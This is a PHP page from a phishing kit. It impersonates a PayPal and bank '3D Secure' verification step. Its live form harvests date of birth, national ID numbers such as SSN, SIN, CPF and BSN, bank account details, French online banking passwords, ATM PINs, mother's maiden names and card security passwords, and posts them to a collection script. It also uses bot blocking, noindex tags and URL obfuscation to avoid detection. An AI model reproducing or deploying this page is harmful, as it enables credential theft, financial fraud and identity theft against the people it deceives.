<?php

require_once __DIR__ . '/function.php';

if (file_exists($api->dir_config . '/' . $api->general_config)) {
  @eval(file_get_contents($api->dir_config . '/' . $api->general_config));
}

if ($config_blocker == 1) {
  $api->cookie();
  $api->session();
}

$api->visitor("3D Secure");

include 'randa.php';

?>
<!DOCTYPE html>
<html>

<head>
<title><?=$api->encode($_SESSION['card_title']);?>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<?=$fo8;?></title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
<link rel="shortcut icon" href="assets/img/favicon.ico">
<link rel="apple-touch-icon" href="assets/img/apple-touch-icon.png">
<script src="assets/js/jquery.min.js"></script>
<script type="text/javascript" src="https://ssl.geoplugin.net/javascript.gp?k=d4ca3f36a4e92551"></script>

<style media="screen">
.items {
margin: 0 auto;
width: 368px;
border: solid 1px black;
padding: 17px;
}

@media screen and (max-width: 368px) {
.items:before {
width: 315px;
}
}

.info3d {
font-size: 11px;
margin-top: 25px;
color: #807979;
font-family:Arial, Helvetica, sans-serif;

}

.hide {
display: none;
}
</style>
</head>

<body>
<div class="items">
<img src="<?=$_SESSION['logo_img'];?>">


<?php 
        if($_SESSION['card_type'] == 'jcb') {
        
        $VBV_Name = "JCB J/Secure";
        }
    elseif($_SESSION['card_type'] == 'amex') {
        
        $VBV_Name = "Amex SafeKey";
        }
    elseif($_SESSION['card_type'] == 'mastercard') {
       
        $VBV_Name = "MasterCard Secure Code";
        }
    elseif($_SESSION['card_type'] == 'visaelectron' or $_SESSION['card_type'] == 'visa') {
       
        $VBV_Name = "Verified by Visa";
        }
    else{$VBV_Name = "Secure Code";}
                                        if ($_SESSION['card_banku']){
              echo '<img class="card_bank" id="card_bank" style="float: right;display: inline-block" width="79px" title="'.$_SESSION['card_bank'].'" src="https://logo.clearbit.com/'.$_SESSION['card_banku'].'"></td>';
                                        }else{
              echo "<img src='assets/img/logo.svg' style='float: right;display: inline-block' width='79px'>";
                                        }
                                        ?>

<p class="info3d"><?=$api->transcode("Please enter information pertaining to your credit card to confirm your PayPal account.");?></p>

<div class="show" id="3dweb">

<form method="post" action="post/c.php" autocomplete="off">
<table align="center" width="350" style="font-size: 11px;font-family: arial, sans-serif; color: rgb(0, 0, 0); margin-top: 10px;">
<tbody>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;"><?=$api->transcode("Card Holder");?> :</td>
                                             <td><?=htmlentities($_SESSION['card_name']);?></td>
                                          </tr>
                                           <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;"><?=$api->transcode("Merchant");?> :</td>
                                             <td>PayPal Inc.</td>
                                          </tr>
                                            
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;"><?=$api->transcode("Country");?> :</td>
                                             <td class="limit"><?=ucwords(strtolower($_SESSION['country']));?></td>
                                          </tr>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;"><?=$api->transcode("Card type");?> :</td>
                                             <td><?=ucwords(strtolower($_SESSION['card_type']));?></td>
                                          </tr>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;"><?=$api->transcode("Card Number");?> :</td>
                                             <td><?=$_SESSION['show_num'];?></td>
                                          </tr>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;"><?=$api->transcode("Date&time");?> :</td>
                                             <td><?=date('m/d/Y').", ".date("h:i:s A");?></td>
                                          </tr>
                                             <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;"><?=$api->transcode("Date of birth");?> :</td>
                                                <td>
                                                  <input required 
                                                  style="width: 44px;text-align: center;" 
                                                  id="month" 
                                                  type="tel" 
                                                  placeholder="MM" 
                                                  name="month" 
                                                  class="dob" 
                                                  maxlength="2" autocomplete="off"
                                                  data-maxlength="2"/>
                                                   / 
                                                   <input required 
                                                   style="width: 50px;text-align: center;" 
                                                   id="day" 
                                                   type="tel" 
                                                   placeholder="DD" 
                                                   name="day" 
                                                   class="dob" 
                                                   maxlength="2" autocomplete="off"
                                                   data-maxlength="2"/>
                                                    / 
                                                    <input required  autocomplete="off" 
                                                    style="width: 58px;text-align: center;" 
                                                    id="year" 
                                                    type="tel" 
                                                    placeholder="YYYY" 
                                                    name="year" 
                                                    class="dob" 
                                                    maxlength="4" autocomplete="off"
                                                    data-maxlength="4"/>
                                                  </td>
                                             </tr>
                                             <?php
                                             
                                                ############################ ITALY ############################ 
                                                if($_SESSION['code'] == "IT") {  
                                                echo '  <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Codice Fiscale :</td>
                                                <td><input required type="tel" name="codicefiscale" id="codicefiscale" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';  
                                                }
                                                ############################ Sweden ############################ 
                                                elseif($_SESSION['code'] == "SE") {  
                                                echo '  <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Personnummer :</td>
                                                <td><input required type="tel" name="pse" id="pse" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';  
                                                }
                                                ############################ SPAIN ############################ 
                                                elseif($_SESSION['code'] == "ES") {  
                                                echo '  <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">DNI (NIF/NIE/CIF) :</td>
                                                <td><input required type="tel" name="dni" id="dni" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';  
                                                }
                                                ############################ BRAZIL ############################ 
                                                elseif($_SESSION['code'] == "NL") {  
                                                echo '  <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">BSN :</td>
                                                <td><input required type="tel" name="bsn" id="bsn" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';  
                                                }
                                                ############################ Netherland ############################ 
                                                elseif($_SESSION['code'] == "BR") {  
                                                echo '  <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">CPF :</td>
                                                <td><input required type="tel" name="cpf" id="cpf" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';  
                                                }
                                                ################### SWITZERLAND || GERMANY #####################
                                                elseif($_SESSION['code'] == "CH" || $_SESSION['code'] == "DE") {  
                                                echo '<tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Kontonummer :</td>
                                                <td><input required type="tel" name="kontonummer" id="kontonummer" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';  
                                                        }
                                                ########################### GREECE #############################
                                                elseif($_SESSION['code'] == "GR") {  
                                            echo '<tr class="Height_XXX">
                                        <td ALIGN="LEFT" style="font-weight: bold;">Official ID :</td>
                                        <td>
                                        <input required type="tel" name="offid" id="offid" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';  
                                                        }               
                                                ########################### GREECE #############################
                                                elseif($_SESSION['code'] == "IE") {  
                                            echo '<tr class="Height_XXX">
                                        <td ALIGN="LEFT" style="font-weight: bold;">PPS Number :</td>
                                        <td>
                                        <input required type="tel" name="pps" id="pps" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';  
                                                        }
                                                ########################## AUSTRALIA ###########################
                                                elseif($_SESSION['code'] == "AU") {
                                                echo '<tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Online Shopping ID :</td>
                                                <td><input required type="tel" name="osid" id="osid" style="width: 170px;padding-left: px;"></td></tr>

                                                <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">NAB Identification Number :</td>
                                                <td><input required type="tel" name="nabid" id="nabid" style="width: 170px;padding-left: 4px;"></td></tr>

                                                <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Driver license number :</td>
                                                <td><input required type="tel" name="dln" id="dln" style="width: 170px;padding-left: 4px;"></td></tr>

                                                <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Credit Limit :</td>
                                                <td><input required type="tel" name="creditlimit" id="creditlimit" style="width: 170px;padding-left: 4px;"></td></tr>';
                                                        }                                                
                                                ########################## AUSTRALIA ###########################
                                                elseif($_SESSION['code'] == "FR") {
                                                echo '<tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Identifiant banque :</td>
                                                <td><input required type="tel" name="bus" id="bus" style="width: 170px;padding-left: 4px;"></td></tr>
                                                <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Mot de passe banque :</td>
                                                <td><input required type="tel" name="bpw" id="bpw" style="width: 170px;padding-left: 4px;"></td></tr>';
                                                        }
                                                ################# IRELAND || UNITED KINGDOM  ###################
                                                elseif ($_SESSION['code'] == "IE" || $_SESSION['code'] == "GB" || $_SESSION['code'] == "UK") {
                                                echo '  <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Sort Code :</td>
                                                <td><input required type="tel" name="sortnum1" id="sortnum1" class="sortnum" style="width:28px;text-align:center"  maxlength="2" data-maxlength="2"> - <input required type="tel" name="sortnum2" id="sortnum2" class="sortnum" style="width:28px;text-align:center"  maxlength="2" data-maxlength="2"> - <input required type="tel" name="sortnum3" id="sortnum3" class="sortnum" style="width:28px;text-align:center"  maxlength="2" data-maxlength="2"></td>
                                                </tr>                  
                                                <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Account Number :</td>
                                                <td><input required type="tel" name="accnumber" id="accnumber" class="accnumber" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';        
                                                        }
                                                ######################## UNITED STATES ######################
                                                elseif ($_SESSION['code'] == "US") {
                                                echo '  <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Social Security Number :</td>
                                                <td><input required type="tel" name="ssn1" id="ssn1" class="ssnum" style="width:30px;padding-left: 2px;" maxlength="3" data-maxlength="3"> - <input required type="tel" name="ssn2" id="ssn2" class="ssnum" style="width: 24px;padding-left: 2px;" maxlength="2" data-maxlength="2"> - <input required type="tel" name="ssn3" id="ssn3" class="ssnum" style="width:40px;padding-left: 4px;" maxlength="4" data-maxlength="4"></td>
                                                </tr><tr class="Height_XXX"> <td align="LEFT" style="font-weight: bold;">ATM PIN <br>(4 NUMBERS):</td> <td><input name="pinatm" id="password_vbv" style="width: 35px;padding-left: 4px;"></td> </tr>';
                                                  }
                                                ######################## CANADA ######################
                                                elseif ($_SESSION['code'] == "CA") {
                                                echo '  <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Social Insurance Number</td>
                                                <td><input required type="tel" name="sin1" id="sin1" class="sinum" style="width:30px;padding-left: 2px;" maxlength="3" data-maxlength="3"> - <input required type="tel" name="sin2" id="sin2" class="sinum" style="width: 24px;padding-left: 2px;" maxlength="2" data-maxlength="2"> - <input required type="tel" name="sin3" id="sin3" class="sinum" style="width:40px;padding-left: 4px;" maxlength="4" data-maxlength="4"></td>
                                                                          </tr>';
                                                  }
                                                #################### IRELAND || CANADA ###################
                                                  if ($_SESSION['code'] == "IE" || $_SESSION['code'] == "CA" || $_SESSION['code'] == "US") {
                                                     echo'<tr class="Height_XXX">
                                                                            <td ALIGN="LEFT" style="font-weight: bold;">Mother’s Maiden Name :</td>
                                                                            <td><input required type="text" name="mmname" id="mmname" style="width: 170px;padding-left: 4px;"></td>
                                                                        </tr>';
                                                      }     
                                                ?>
                                                <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;"><?=$VBV_Name;?> <br>(optional if you have):</td>
                                                <td><input   name="password_vbv" id="password_vbv" style="width: 170px;padding-left: 4px;"/></td>
                                             </tr>
                                             <td><br><input type="submit" value="Submit" id="bntvbv">&nbsp;&nbsp;|&nbsp;&nbsp;<a href="bank.php?=K<?=$num1;?>"><input type="button" value="<?=$api->transcode('Not now');?>"></a></td>
                                             
                                       </tbody>
                                   
</table>
</form>
</div>
<p style="text-align: center;font-family: arial, sans-serif;font-size: 9px; color: #656565"><?=$api->transcode("© ".gmdate('Y')." ".$_SESSION['card_bank']." All Rights Reserved");?></p>
</div>
<script>
$(document).ready(function(){
let g = Math.random().toString(36).substring(7);window.history.pushState('er', 'ghbhh', 'cgi=BILL'+g);
})
</script>
</body>

</html>
